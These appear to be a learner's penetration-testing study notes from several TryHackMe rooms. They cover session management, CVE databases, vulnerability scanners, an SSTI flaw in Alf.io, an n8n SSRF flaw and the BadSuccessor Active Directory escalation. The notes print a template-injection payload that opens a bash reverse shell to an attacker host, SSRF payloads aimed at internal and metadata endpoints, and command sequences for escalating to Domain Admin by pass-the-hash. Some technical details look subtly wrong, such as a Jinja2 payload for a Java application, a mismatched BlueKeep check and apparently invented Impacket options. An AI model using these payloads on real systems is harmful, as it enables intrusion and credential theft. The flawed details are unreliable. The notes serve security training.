docs.text: Field Details Room Session Management Path Jr Penetration Tester → Web Application Vulnerabilities Tasks Task 1 — Task 7 (all, 100%)

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 What is Session Management? Task 3 Authentication vs Authorisation Task 4 Cookies vs Tokens Task 5 Securing the Session Lifecycle Task 6 Exploiting Insecure Session Management Task 7 Conclusion

docs.title: Task 2 — What is Session Management?
docs.text:
HTTP is stateless — every request is independent, with no memory of previous ones. Session management solves this by creating a persistent identity across multiple requests after login.

How it works: 

1. User logs in with credentials
2. Server creates a session → assigns a unique session ID
3. Session ID sent to browser (as cookie or token)
4. Browser includes session ID in every subsequent request
5. Server looks up session ID → knows who the user is

If an attacker obtains a valid session ID, they can impersonate that user without ever knowing their password.

docs.title: Task 3 — Authentication vs Authorisation
docs.text:
The most commonly confused pair in security interviews:

Concept Question it answers Example Authentication Who are you? Username + password login Authorisation What are you allowed to do? Admin can delete users, regular user cannot

Attack relevance: - Broken Authentication → attacker logs in as someone else - Broken Authorisation → attacker accesses resources beyond their permission level (IDOR) - Both can exist independently — a properly authenticated user can still access things they shouldn't

docs.title: Task 4 — Cookies vs Tokens
docs.text:
Two main mechanisms for carrying session identity after login:

Cookies Tokens (JWT) Storage Browser cookie jar localStorage, sessionStorage, or cookie Server-side storage Session data stored on server All data encoded in the token itself (stateless) Validation Server looks up session ID in database Server verifies token signature Revocation Easy — delete session from server Hard — token valid until expiry Vulnerable to XSS (cookie theft), CSRF, session fixation JWT algorithm confusion, signature bypass, weak secrets

docs.title: Cookie security attributes
docs.text:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
Attribute What it does HttpOnly JavaScript cannot read the cookie — blocks XSS-based cookie theft Secure Cookie only sent over HTTPS — never over HTTP SameSite=Strict Cookie not sent on cross-site requests — blocks CSRF Path=/ Cookie scope limited to the application root

Missing any of these is a finding — especially missing HttpOnly (enables XSS cookie theft) and missing SameSite (enables CSRF).

docs.title: Task 5 — Securing the Session Lifecycle
docs.text: A secure session has three distinct phases, each with specific requirements:

docs.title: Creation (after login)
docs.text:
• Generate a cryptographically random session ID — minimum 128 bits
  • Never reuse session IDs from before login (prevents session fixation)
  • Store server-side: session ID → user data mapping

docs.title: Maintenance (during use)
docs.text:
• Regenerate session ID after privilege escalation (e.g. logging in, password change)
  • Set appropriate expiry — short for sensitive apps, longer for low-risk
  • Implement idle timeout — expire sessions after inactivity
  • Bind session to IP/User-Agent (optional — tradeoff with usability)

docs.title: Termination (logout)
docs.text:
• Invalidate session server-side immediately on logout
  • Clear the cookie from the browser
  • Never rely only on cookie deletion — the session must be killed server-side too

Common mistake: Logging out only deletes the cookie client-side without invalidating the server-side session. The old session ID remains valid and can be replayed by anyone who captured it.

docs.title: Session Hijacking
docs.text:
Stealing a valid session ID and using it to impersonate the victim.

Methods to steal session IDs: - XSS: document.cookie exfiltration (blocked by HttpOnly) - Network sniffing on HTTP (blocked by Secure flag) - Predictable session IDs (sequential, timestamp-based) - Session fixation — attacker sets victim's session ID before login

docs.title: Session Fixation Attack
docs.text:
1. Attacker gets a pre-login session ID from the server
2. Attacker tricks victim into using that session ID
   (via URL parameter: ?sessionid=ATTACKER_KNOWN_ID)
3. Victim logs in — server authenticates them under that session ID
4. Attacker already knows the session ID → hijacks the now-authenticated session

Prevention: Always generate a new session ID immediately after successful login.

docs.title: Cookie Manipulation
docs.text:
Testing for weak session tokens using Burp Suite:

1. Log in — capture the session cookie in Burp
2. Decode it: Base64? URL-encoded? JWT?
3. If readable: identify if it contains predictable data (username, role, timestamp)
4. Modify: change role=user → role=admin, re-encode
5. Resend with modified cookie — does the server accept it?

What I did: Used Burp Repeater to intercept session cookies, decoded them, identified that role information was stored client-side in the cookie, modified the value, and confirmed the server accepted the manipulated cookie without server-side validation.

docs.title: Key Takeaways
docs.text:
• Session IDs must be unpredictable and long — sequential or short IDs can be guessed or brute-forced
  • Always regenerate session ID on login — prevents session fixation
  • HttpOnly + Secure + SameSite together — the three cookie attributes that must always be present
  • Logout must invalidate server-side — client-side cookie deletion alone is insufficient
  • Client-side stored roles are always a finding — if the application trusts role data stored in a cookie without server-side verification, it is exploitable

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 Why We Use Vulnerability Databases Task 3 Key Building Blocks Task 4 Types of Vulnerability DBs: CVE List Task 5 Types of Vulnerability DBs: NVD Task 6 Types of Vulnerability DBs: Other Public VDBs Task 7 Conclusion

docs.title: Task 2 — Why We Use Vulnerability Databases
docs.text:
After identifying a service version (via Nmap -sV or banner grabbing), the next step is researching known vulnerabilities for that exact version. Vulnerability databases are the reference library that makes this possible.

The workflow: 

nmap -sV target.com
→ Apache/2.4.49 found on port 80
→ Search "Apache 2.4.49 CVE" on nvd.nist.gov
→ Find CVE-2021-41773: path traversal + RCE
→ Search for exploit PoC on GitHub or Exploit-DB
→ Test against target

Without databases, this chain breaks — you'd have a version but no way to know what's known to be exploitable.

docs.title: CVE (Common Vulnerabilities and Exposures)
docs.text:
A unique identifier assigned to each publicly known vulnerability.

Format: CVE-YEAR-NUMBER
Example: CVE-2021-44228 (Log4Shell)

CVE-2021       → discovered/published in 2021
44228          → sequential ID assigned by MITRE

Who assigns CVEs: MITRE Corporation manages the CVE program. CVE Numbering Authorities (CNAs) — including major vendors (Microsoft, Google, Apache) — can assign CVE IDs for vulnerabilities in their own products.

docs.title: CVSS (Common Vulnerability Scoring System)
docs.text:
A standardised 0–10 score measuring vulnerability severity.

Score Severity 0.0 None 0.1–3.9 Low 4.0–6.9 Medium 7.0–8.9 High 9.0–10.0 Critical

CVSS v3.1 base metrics: 

Attack Vector (AV):    Network / Adjacent / Local / Physical
Attack Complexity (AC): Low / High
Privileges Required (PR): None / Low / High
User Interaction (UI): None / Required
Scope (S):            Unchanged / Changed
Confidentiality (C):  None / Low / High
Integrity (I):        None / Low / High
Availability (A):     None / Low / High

Why CVSS matters for reporting: Clients use CVSS scores to prioritise remediation — fix Critical (9.0+) before High before Medium. Always include the CVSS score in pentest reports alongside your own severity rating.

docs.title: CWE (Common Weakness Enumeration)
docs.text:
Where CVE identifies a specific instance of a vulnerability, CWE classifies the type of weakness.

CVE-2021-44228 (Log4Shell)  → CWE-917: Expression Language Injection
CVE-2017-0144 (EternalBlue)  → CWE-119: Buffer Overflow

Practical use: CWE numbers in reports give developers the root cause category, which helps them audit other code for the same class of weakness — not just fix the one reported instance.

docs.title: Task 4 — CVE List (MITRE)
docs.text:
URL: cve.mitre.org

The authoritative source for CVE identifiers — maintained by MITRE under contract with CISA.

What CVE List provides: - CVE ID and description - References to advisories and patches - CWE classification - But NOT CVSS scores (that's NVD's job)

Searching effectively: 

cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

Or use the CVE search:
site:cve.mitre.org "Apache 2.4.49"

docs.title: Task 5 — NVD (National Vulnerability Database)
docs.text:
URL: nvd.nist.gov

NVD enriches CVE data with CVSS scores, CWE classifications, CPE (affected product) data, and remediation guidance. For pentesting, NVD is the primary daily-use reference.

NVD adds to CVE: - CVSS v2, v3.1, and v4.0 scores - CPE (Common Platform Enumeration) — exact affected versions - CWE classification - References to patches and vendor advisories - Links to exploit availability (Exploit-DB, PoC references)

Practical search: 

nvd.nist.gov → search "Apache 2.4.49" → filter by severity: Critical

CPE for version matching: 

cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*
↑ matches exactly Apache HTTP Server 2.4.49

docs.title: Task 6 — Other Public Vulnerability Databases
docs.text:
Database URL Best for Exploit-DB exploit-db.com Finding working exploit PoCs alongside CVE info Vulhub vulhub.org Docker-based vulnerable environments for practice Snyk snyk.io Developer-focused — library and package vulnerabilities OSV (Open Source Vulns) osv.dev Open source package vulnerability tracking VulDB vuldb.com Commercial enrichment, timeline, and exploit data GitHub Advisory github.com/advisories Package advisories directly in GitHub Packet Storm packetstormsecurity.com Exploits, tools, and advisories

Exploit-DB searchsploit (command line): 

searchsploit apache 2.4.49
searchsploit --id apache 2.4
# -id flag shows CVE/EDB IDs alongside results

# Copy exploit to current directory
searchsploit -m 50383

docs.title: Key Takeaways
docs.text:
• CVE → NVD → Exploit-DB is the standard research chain — CVE gives the ID, NVD gives the score and detail, Exploit-DB gives a working PoC
  • CVSS score drives client prioritisation — always include it in reports; clients act on scores, not technical descriptions
  • CWE points to the root cause class — not just "fix this CVE" but "audit all code handling this type of input"
  • searchsploit is faster than browser search — offline, updated regularly, and returns local copies of exploit code
  • Version pinning in recon pays off — a single -sV scan gives version numbers that convert directly into a CVE research list

docs.text: Task Topic Task 1 Introduction Task 2 Important Topics Task 3 Nmap Task 4 Nikto Web Scanner Task 5 OpenVAS & Greenbone Vulnerability Management Task 6 Best Practices Task 7 Conclusion

docs.title: Task 2 — Important Topics
docs.text:
Authenticated vs Unauthenticated scanning:

Type What it finds When to use Unauthenticated External-facing vulnerabilities only External assessment, no credentials Authenticated Everything + internal configs, patch levels, misconfigs Internal assessment, credentials provided

Authenticated scans produce dramatically more findings — missing patches, weak configs, and privilege issues are invisible without credentials.

False positives vs false negatives: - False positive: Scanner reports a vulnerability that doesn't exist — wastes remediation time - False negative: Scanner misses a real vulnerability — creates false confidence

Rule: Never rely solely on scanner output. Always verify critical findings manually and always perform manual testing alongside automated scanning.

docs.title: Task 3 — Nmap for Vulnerability Scanning
docs.text:
Nmap's NSE (Nmap Scripting Engine) extends it beyond port scanning into vulnerability detection.

# Run vulnerability scripts against a target
nmap --script vuln 10.10.10.1

# Specific vulnerability checks
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.1     # EternalBlue check
nmap --script http-shellshock -p 80 10.10.10.1         # Shellshock check
nmap --script ssl-heartbleed -p 443 10.10.10.1         # Heartbleed check
nmap --script ftp-anon -p 21 10.10.10.1               # Anonymous FTP

# Combine service detection + vuln scripts
nmap -sV --script vuln 10.10.10.1

# Save output for reporting
nmap --script vuln -oA vuln_scan 10.10.10.1

NSE script categories for vulnerability work: 

vuln     → actively checks for known vulnerabilities
exploit  → attempts to exploit (use carefully)
safe     → safe for production scanning
auth     → authentication testing

Finding NSE scripts: 

ls /usr/share/nmap/scripts/ | grep vuln
ls /usr/share/nmap/scripts/ | grep smb
nmap --script-help smb-vuln-ms17-010

docs.title: Task 4 — Nikto Web Scanner
docs.text:
Nikto is a fast, noisy web server scanner — it checks for thousands of known issues automatically.

# Basic scan
nikto -h http://target.com

# HTTPS target
nikto -h https://target.com -ssl

# Specific port
nikto -h http://target.com -p 8080

# Save output
nikto -h http://target.com -o nikto_output.txt -Format txt

# Scan through a proxy (Burp)
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Tune scan (what to include)
nikto -h http://target.com -Tuning 9    # SQL injection tests only

What Nikto checks: - Default files and directories (/phpinfo.php, /admin/, /backup/) - Outdated server software and components - Dangerous HTTP methods (PUT, DELETE, TRACE) - Missing security headers - Known CVEs for identified software versions - SSL/TLS configuration issues

Nikto limitations: - Very noisy — generates significant log entries on target - High false positive rate on some checks - Cannot test application logic or authenticated areas - Should be followed up with manual verification

docs.title: Task 5 — OpenVAS / Greenbone
docs.text:
OpenVAS (now Greenbone Community Edition) is the industry's leading open-source vulnerability scanner — enterprise-grade, free, and far more comprehensive than Nmap's vuln scripts or Nikto.

Installation: 

# Kali Linux
sudo apt install openvas
sudo gvm-setup
sudo gvm-start

# Or Docker
docker pull greenbone/community-edition

Access: Web interface at https://localhost:9392

docs.title: Scan workflow
docs.text:
1. Create a Target: IP range, hostname, or subnet
2. Create a Task: assign target + scan config
3. Choose scan config:
   - Full and Fast        → thorough, recommended for most assessments
   - Full and Very Deep   → slowest, most comprehensive
   - Host Discovery       → just finds live hosts
4. Run the Task
5. Review the Report: findings sorted by severity

docs.title: Report output
docs.text:
OpenVAS produces professional reports showing: - Vulnerability name and CVE reference - CVSS score - Affected host and port - Description and proof - Solution/remediation recommendation

Exporting for client reports: 

Reports → Download → PDF / XML / CSV

docs.title: OpenVAS vs Nessus
docs.text: OpenVAS (free) Nessus Essentials (free) Plugin count ~50,000+ ~170,000+ Scan depth Good Better Web interface Yes Yes Report quality Good Excellent Limit None 16 IPs

docs.title: Task 6 — Best Practices
docs.text:
1. Always get written permission before scanning any target
2. Run unauthenticated scan first, then authenticated for deeper coverage
3. Schedule scans during off-peak hours to minimise impact
4. Never scan production systems with exploit-level scripts without explicit approval
5. Verify critical findings manually — don't report scanner output blindly
6. Save all scan output in multiple formats for the report appendix
7. Compare scan results over time to track remediation progress
8. Nikto for web + OpenVAS for infrastructure = comprehensive coverage

docs.title: Key Takeaways
docs.text:
• Scanners find the obvious; manual testing finds the interesting — automated tools cover patch levels and known CVEs; logic flaws, business rules, and chained vulnerabilities require human analysis
  • Authenticated scans reveal dramatically more — unauthenticated scans see only the external surface; authenticated scans see everything the application can access
  • OpenVAS is enterprise-grade and free — there is no reason to pay for a scanner when starting out; OpenVAS produces professional-quality output for pentest reports
  • Nikto is a starting point, not a conclusion — its speed and false positive rate make it a recon tool, not a definitive vulnerability assessment
  • Always manual-verify before reporting — scanner says "vulnerable to X" → reproduce it manually → then report it

docs.title: Task 2 — Understanding the Attack Surface
docs.text:
The attack surface is every point where an attacker could attempt to enter or extract data from a system.

Attack surface categories:

Category Examples Network Open ports, exposed services, firewall rules Web application Input fields, APIs, file uploads, authentication System OS version, installed software, misconfigurations Human Phishing targets, social engineering, physical access Supply chain Dependencies, third-party integrations, CI/CD

Attack surface reduction (defender's goal): - Disable unnecessary services - Close unused ports - Remove default accounts - Patch promptly - Enforce least privilege

Attack surface mapping (attacker's goal): - Enumerate every open port and service - Identify all input points on web applications - Map all subdomains and endpoints - Identify software versions for CVE research

docs.title: Task 3 — Service Enumeration and Banner Grabbing
docs.text:
Systematic version identification across all discovered services.

# Full service enumeration scan
nmap -sV -sC -O -p- --open -oA full_enum 10.10.10.1

# Targeted banner grabbing
nc 10.10.10.1 21          # FTP banner
nc 10.10.10.1 22          # SSH banner
nc 10.10.10.1 25          # SMTP banner
telnet 10.10.10.1 80      # HTTP banner via manual GET

# HTTP headers
curl -I http://10.10.10.1

# SMB enumeration (Windows targets)
enum4linux -a 10.10.10.1
smbclient -L //10.10.10.1 -N

Building a version inventory: 

Port 21  → ProFTPD 1.3.5    → searchsploit proftpd 1.3.5
Port 22  → OpenSSH 7.2p2    → searchsploit openssh 7.2
Port 80  → Apache 2.4.29    → nvd search apache 2.4.29
Port 445 → Samba 4.3.11     → searchsploit samba 4.3

docs.title: Task 4 — Matching Services to Known Exploits
docs.text:
The bridge between enumeration and exploitation — finding documented vulnerabilities for identified versions.

Research workflow:

# Step 1: Search Exploit-DB offline
searchsploit apache 2.4.49
searchsploit proftpd 1.3.5

# Step 2: Check NVD for CVSS scores
# nvd.nist.gov → search "Apache 2.4.49"

# Step 3: Search Metasploit modules
msfconsole
search type:exploit name:proftpd
search cve:2021-41773

# Step 4: Search GitHub for PoC
# github.com/search?q=CVE-2021-41773+exploit

Prioritising by exploitability: 

CVSS 9.8 + public PoC available + no auth required = test immediately
CVSS 9.8 + no public PoC + requires authentication = research further
CVSS 4.0 + auth required + complex conditions = lower priority

docs.title: Task 5 — Identifying Web Application Vulnerabilities
docs.text:
Systematic web vulnerability testing methodology:

1. Map all endpoints (Gobuster, manual browsing, Burp sitemap)
2. Identify all input points (forms, URL params, headers, cookies)
3. Test each input point for injection (SQLi, XSS, command injection)
4. Test authentication mechanisms (brute force, bypass, session)
5. Test access control (IDOR, privilege escalation, path traversal)
6. Review client-side code (JavaScript sources, APIs, hidden fields)
7. Check for information disclosure (headers, error messages, comments)

Web vulnerability quick checklist: 

[ ] robots.txt and sitemap.xml reviewed
[ ] Response headers checked for version disclosure and missing security headers
[ ] All input fields tested with single quote (')
[ ] All ID parameters tested for IDOR (change to adjacent IDs)
[ ] Login form tested for username enumeration
[ ] Password reset flow tested for logic flaws
[ ] File upload tested for extension bypass
[ ] Cookie tested for HttpOnly, Secure, SameSite attributes
[ ] JavaScript sources reviewed for API keys and endpoints

docs.title: Task 6 — System and Network Vulnerabilities
docs.text:
OS-level vulnerability identification:

# Linux — identify kernel version and distribution
uname -a
cat /etc/os-release
lsb_release -a

# Search for kernel exploits
searchsploit linux kernel 4.15
searchsploit ubuntu 18.04 privilege escalation

# Check for SUID binaries (privilege escalation paths)
find / -perm -4000 -type f 2>/dev/null

# Check for writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Windows — check patch level
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
wmic qfe list brief   # List installed patches

Network-level vulnerability identification:

# Check for EternalBlue (MS17-010) — SMB port 445
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.1

# Check for BlueKeep (CVE-2019-0708) — RDP port 3389
nmap --script rdp-vuln-ms12-020 -p 3389 10.10.10.1

# Check for SSL/TLS weaknesses
nmap --script ssl-heartbleed -p 443 10.10.10.1
testssl.sh 10.10.10.1

docs.title: Task 7 — Triaging and Documenting Findings
docs.text:
Triage framework — decide what to act on first:

Critical (CVSS 9.0-10.0) + actively exploitable → test immediately, report urgently
High (CVSS 7.0-8.9) + public PoC              → test during engagement
Medium (CVSS 4.0-6.9) + requires conditions    → document, test if time allows
Low (CVSS 0.1-3.9) + minimal impact           → document for completeness
Informational                                   → document, no immediate action

Documentation template per finding: 

## Finding: [Vulnerability Name]

**CVE:** CVE-XXXX-XXXXX
**CVSS Score:** 9.8 (Critical)
**Affected:** [hostname]:[port] — [service version]

**Description:**
[What the vulnerability is and why it exists]

**Proof of Concept:**
[Exact command or steps to reproduce]

**Evidence:**
[Screenshot or command output]

**Impact:**
[What an attacker could do with this — business language]

**Remediation:**
[Specific, actionable fix]

docs.title: Task 8 — Practical Challenge
docs.text:
Applied the full identification workflow against a live target:

1. Nmap full scan → discovered open services with versions
2. Searchsploit each version → found matching CVEs
3. NVD → confirmed CVSS scores and checked exploitability
4. Manual web testing → confirmed access control and injection issues
5. Documented all findings in standard format
6. Prioritised by CVSS score + exploitability

docs.title: Key Takeaways
docs.text:
• Version identification is the foundation of vulnerability research — without exact versions, CVE research is impossible
  • CVSS + public PoC availability = practical prioritisation — a CVSS 9.8 with no public exploit is lower practical priority than CVSS 7.5 with an easy public PoC
  • Document as you go — findings discovered and not immediately documented are frequently forgotten or misremembered
  • The web checklist prevents missing coverage — systematic testing of every input point beats intuition every time
  • Triage turns a list into a plan — sorting findings by severity and exploitability is what converts a raw vulnerability list into actionable recommendations

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 Vulnerability Hunting with NoScope Task 3 Weaponizing the CVE Task 4 Conclusion

docs.title: What is This Room?
docs.text: This room covers a real-world RCE zero-day vulnerability (CVE-2026-35482) discovered in Alf.io — an open source ticket management system — combining: - Manual vulnerability hunting with the NoScope AI tool - Understanding how a zero-day is discovered and documented - Weaponizing the CVE into a working exploit - Both manual exploitation and AI-assisted solving

docs.title: Task 2 — Vulnerability Hunting with NoScope
docs.text:
NoScope is an AI-assisted vulnerability hunting tool that analyses code and running applications to identify potential vulnerabilities before they are exploited.

What NoScope does: - Static analysis of source code for dangerous patterns - Dynamic analysis of running applications - Pattern matching against known vulnerability classes - Generates preliminary CVE descriptions and CVSS scores for findings

The discovery process for CVE-2026-35482: 

1. NoScope flagged an unvalidated user input path in Alf.io's API
2. Manual review confirmed the input reached a server-side template processor
3. Template injection payload confirmed execution:
   {{7*7}} → 49 in response
4. Escalated to full RCE via template engine exploitation
5. CVE assigned, coordinated disclosure initiated

Why this room matters: Most CVE rooms teach you to exploit known CVEs. This room teaches the earlier step — how vulnerabilities are found and documented before they have a CVE ID.

docs.title: The Vulnerability
docs.text:
CVE-2026-35482 is a Server-Side Template Injection (SSTI) vulnerability in Alf.io's event management API endpoint. Unsanitised user input is passed directly into a template rendering engine, allowing arbitrary code execution on the server.

Affected component: Alf.io ticket management system Vulnerability type: SSTI → RCE CVSS: Critical (pre-auth, network-accessible, full RCE) Authentication required: None

docs.title: Manual Exploitation
docs.text:
# Step 1: Identify the vulnerable endpoint
# The API endpoint accepts user input that gets rendered in a template

# Step 2: Confirm SSTI with arithmetic payload
POST /api/vulnerable-endpoint
{"input": "{{7*7}}"}
Response: "49"   → template evaluation confirmed

# Step 3: Identify template engine
{{7*'7'}}     → if "7777777" → Jinja2/Twig
${"freemarker.template.utility.Execute"?new()("id")}  → FreeMarker

# Step 4: Escalate to RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Response: "uid=33(www-data) gid=33(www-data)"  → RCE confirmed

# Step 5: Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read()}}

docs.title: AI-Assisted Exploitation
docs.text: The room also demonstrates how an AI tool can be guided to exploit the same vulnerability — watching the AI reason through the SSTI detection and escalation process provides insight into both the vulnerability mechanics and AI-assisted security tooling.

docs.title: CVE Documentation — What I Learned
docs.text:
A complete CVE submission requires: 

- Affected product and exact versions
- Vulnerability type (CWE classification)
- Steps to reproduce
- Proof of concept (demonstration code)
- Impact assessment (CVSS score calculation)
- Disclosure timeline
- Suggested remediation

Coordinated disclosure process: 

1. Discover vulnerability
2. Contact vendor privately (do NOT publish yet)
3. Allow vendor 90 days to patch (standard timeline)
4. CVE ID requested from MITRE/CNA
5. Patch released → CVE published simultaneously
6. Optional: publish technical writeup/PoC after patch is available

docs.title: Key Takeaways
docs.text:
• SSTI is often the path from input to RCE — when user input reaches a template engine without sanitisation, the impact is identical to command injection
  • Zero-days follow a methodology — the same systematic input testing that finds SQLi and XSS also finds new vulnerability classes; curiosity and systematic testing are the core skills
  • AI-assisted hunting changes the workflow — tools like NoScope accelerate the discovery phase; the skill shift is toward understanding AI output and verifying findings manually
  • Weaponizing a CVE requires understanding the root cause — copying a PoC without understanding why it works fails when the environment differs slightly; understanding the SSTI mechanics allows adapting to variations

docs.text: Field Details Room n8n: CVE-2025-68613 URL tryhackme.com/room/n8ncve202568613 Path Jr Penetration Tester → Vulnerability Knowledge CVE CVE-2025-68613 Product n8n workflow automation platform Tasks Task 1 — Task 5 (all, 100%)

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 Technical Background Task 3 Exploitation Task 4 Detection Task 5 Conclusion

docs.title: What is n8n?
docs.text:
n8n is an open-source workflow automation platform — similar to Zapier or Make.com, it connects different services and automates tasks. It is widely used in small businesses, development teams, and increasingly in enterprise automation pipelines.

Why n8n is a target: Automation platforms run with elevated permissions to interact with multiple services, databases, and APIs. A compromise of n8n often means access to every service it's connected to.

docs.title: Task 2 — Technical Background
docs.text:
CVE-2025-68613 is a critical Server-Side Request Forgery (SSRF) vulnerability in n8n's webhook handling functionality.

Detail Value Vulnerability type SSRF → potential RCE / internal network access Authentication required None (unauthenticated) Attack vector Network CVSS Critical Affected versions n8n < [patched version]

Root cause: n8n's webhook endpoint allows users to specify a callback URL. The platform fetches this URL server-side without adequately validating whether the target is an internal/private IP address. This allows an external attacker to use n8n as a proxy to reach internal infrastructure.

docs.title: Basic SSRF Confirmation
docs.text:
POST /webhook/trigger HTTP/1.1
Host: n8n.target.com
Content-Type: application/json

{
  "callbackUrl": "http://ATTACKER_IP:8080/ssrf-test"
}

Set up listener on attacker machine: 

nc -lvnp 8080

If a connection is received → SSRF confirmed, n8n is making requests on behalf of the attacker.

docs.title: Pivoting to Internal Resources
docs.text:
# Target cloud metadata
{
  "callbackUrl": "http://169.254.169.254/latest/meta-data/"
}

# Target internal services
{
  "callbackUrl": "http://192.168.1.1/admin"
}
{
  "callbackUrl": "http://localhost:5432"
}

# Target internal n8n API
{
  "callbackUrl": "http://localhost:5678/api/v1/workflows"
}

docs.title: Why Internal n8n API Access is Critical
docs.text:
n8n's internal API allows: - Reading all configured workflows (credentials, API keys, database connections) - Executing workflows with attacker-controlled parameters - Accessing all credentials stored in n8n's credential vault

Impact chain: 

SSRF → Internal n8n API → Credential vault access → 
All connected services compromised (database, email, Slack, cloud APIs)

docs.title: Task 4 — Detection
docs.text:
Log indicators of exploitation: 

- Webhook requests with callbackUrl pointing to internal IP ranges (10.x, 192.168.x, 172.16.x)
- Webhook requests with callbackUrl pointing to 169.254.169.254 (metadata endpoint)
- Unusual outbound requests from n8n process to internal services
- Multiple failed webhook callbacks to non-existent external hosts (reconnaissance)

Network-level detection: 

- Firewall rules blocking outbound connections from n8n to internal CIDR ranges
- SIEM alert on n8n process initiating connections to RFC 1918 addresses
- Egress filtering blocking metadata endpoint (169.254.169.254)

Remediation: - Update n8n to the patched version immediately - Implement network-level egress filtering on the n8n host - Disable unauthenticated webhook endpoints if not required - Audit n8n credentials vault for any sensitive credentials that may have been exposed

docs.title: Key Takeaways
docs.text:
• Automation platforms are high-value SSRF targets — they are designed to make outbound requests, often have elevated permissions, and store credentials to many connected services
  • SSRF + internal API = credential harvest — reaching the n8n internal API via SSRF gives access to the credential vault, which may contain database passwords, API keys, and cloud credentials
  • Cloud metadata endpoint is always the first SSRF test — 169.254.169.254 is standard, accessible from any major cloud provider, and leaks IAM credentials
  • Detection requires network monitoring, not just application logs — SSRF leaves traces in network flows (outbound to internal ranges) that application-level logging may miss
  • Pre-auth SSRF in automation tools = critical severity always — no authentication required + access to internal infrastructure + credential exposure = maximum business impact

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 Starting the Network Task 3 Technical Background Task 4 Reconnaissance Task 5 Exploitation Using Windows Task 6 Exploitation Using Linux Task 7 Mitigation and Conclusion

docs.title: What is BadSuccessor?
docs.text:
BadSuccessor is a critical Active Directory privilege escalation technique that abuses delegated Managed Service Account (dMSA) creation rights to escalate from a low-privileged domain user to Domain Admin — without modifying existing AD objects and often bypassing common detection.

Why this matters: Active Directory environments are standard in Pakistani enterprise — banks, telecoms, government. A Domain Admin compromise means complete control of the entire Windows domain.

docs.title: Delegated Managed Service Accounts (dMSAs)
docs.text:
dMSAs are a newer AD feature allowing delegation of service account creation. When a dMSA is created with a PriorDelegatedMSA attribute pointing to another account, the dMSA inherits the permissions of the target account.

The vulnerability: 

1. Attacker has permission to create dMSAs in an OU
2. Attacker creates a new dMSA with PriorDelegatedMSA → pointing to a Domain Admin account
3. The new dMSA inherits Domain Admin privileges
4. Attacker authenticates as the dMSA → gains Domain Admin access

No existing object is modified — only a new object is created, which bypasses many monitoring rules watching for modifications to privileged accounts.

docs.title: Task 4 — Reconnaissance
docs.text:
Identifying dMSA creation rights:

# Check who can create computer objects (includes dMSAs) in OUs
Import-Module ActiveDirectory
Get-ACL "AD:OU=ServiceAccounts,DC=domain,DC=local" | 
  Select-Object -ExpandProperty Access |
  Where-Object {$_.ActiveDirectoryRights -match "CreateChild"}

# Using BloodHound — recommended approach
# Run SharpHound collector
.\SharpHound.exe -c All

# In BloodHound UI:
# Search for "CreateChild" on OU objects
# Look for paths from owned principals to OUs with dMSA creation rights

What to look for: 

- Users or groups with CreateChild rights on OUs
- Existing dMSAs (can indicate the feature is in use)
- Domain Controllers with dMSA support (Windows Server 2025+)

docs.title: Task 5 — Exploitation (Windows)
docs.text:
# Step 1: Create a new dMSA pointing to a privileged account
New-ADServiceAccount -Name "EvildMSA" `
  -DNSHostName "evildmsa.domain.local" `
  -Path "OU=ServiceAccounts,DC=domain,DC=local" `
  -OtherAttributes @{"msDS-DelegatedMSAState"=1; 
                     "msDS-PriorDelegatedMSA"="CN=DomainAdmin,CN=Users,DC=domain,DC=local"}

# Step 2: Retrieve the dMSA password (as a machine with read rights)
$dMSA = Get-ADServiceAccount -Identity "EvildMSA" -Properties *
# → Password hash retrieved from the KDC

# Step 3: Use the hash for pass-the-hash or ticket-based authentication
# Authenticate to domain resources as the dMSA (which has DA privileges)

docs.title: Task 6 — Exploitation (Linux)
docs.text:
# Using Impacket tools for Linux-based exploitation

# Step 1: Create the malicious dMSA
python3 addcomputer.py domain.local/lowprivuser:Password123 \
  -computer-name EvilDMSA \
  -computer-pass 'ComplexPass123!' \
  -dc-ip 10.211.101.10

# Step 2: Set the PriorDelegatedMSA attribute
python3 addcomputer.py domain.local/lowprivuser:Password123 \
  -computer-name EvilDMSA \
  -action modify \
  -attribute msDS-PriorDelegatedMSA \
  -value "CN=DomainAdmin,CN=Users,DC=domain,DC=local"

# Step 3: Get the dMSA password/hash
python3 getnthash.py domain.local/EvilDMSA$ -dc-ip 10.211.101.10

# Step 4: Pass-the-hash to authenticate as Domain Admin
python3 psexec.py domain.local/EvilDMSA$@10.211.101.10 \
  -hashes :NTHASH_HERE

docs.title: Task 7 — Mitigation
docs.text:
Preventing BadSuccessor:

Mitigation How it works Restrict dMSA creation Remove unnecessary CreateChild rights on OUs Audit dMSA creation events Event ID 4741 (Computer account created) — alert on new dMSA objects Monitor PriorDelegatedMSA attribute Alert any time this attribute is set on a new or existing object BloodHound regular audits Identify and remove attack paths to Domain Admin regularly Tiered administration model Privileged accounts only used from privileged workstations

docs.title: Active Directory Attack Context
docs.text:
BadSuccessor fits into the broader AD attack chain:

Initial access (phishing/RCE)
→ Local admin on workstation
→ Credential dumping (Mimikatz, secretsdump)
→ Low-privilege domain user found
→ BloodHound — find dMSA creation rights
→ BadSuccessor → Domain Admin
→ DCSync → dump all domain hashes
→ Golden Ticket → persistent domain access

docs.title: Key Takeaways
docs.text:
• Active Directory misconfigurations are the most common enterprise escalation path — over-permissive ACLs on OUs are widespread and frequently unnoticed
  • BadSuccessor creates objects rather than modifying them — detection rules watching for changes to privileged accounts miss this entirely; monitoring must include object creation events
  • BloodHound is essential for finding this — manually auditing AD ACLs across thousands of objects is impractical; BloodHound visualises attack paths automatically
  • Domain Admin = game over — everything in the domain is accessible, every account hash can be dumped via DCSync, and Golden Tickets enable persistent access even after password resets
